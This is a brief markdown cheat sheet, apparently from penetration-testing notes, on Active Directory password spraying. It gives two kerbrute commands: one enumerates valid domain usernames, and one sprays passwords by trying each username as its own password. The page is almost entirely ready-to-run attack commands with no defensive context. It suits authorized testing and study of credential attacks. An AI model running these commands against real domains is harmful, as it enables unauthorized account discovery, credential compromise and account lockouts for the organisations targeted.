<p style="text-align: right">_- last update 31/01/2023 -_</p>

# Password spraying

## User enumeration

```bash
kerbrute userenum -d $DOMAIN ./usernames.txt
```

## Password spraying

```bash
kerbrute passwordspray -d $DOMAIN --user-as-pass ./usernames.txt
```
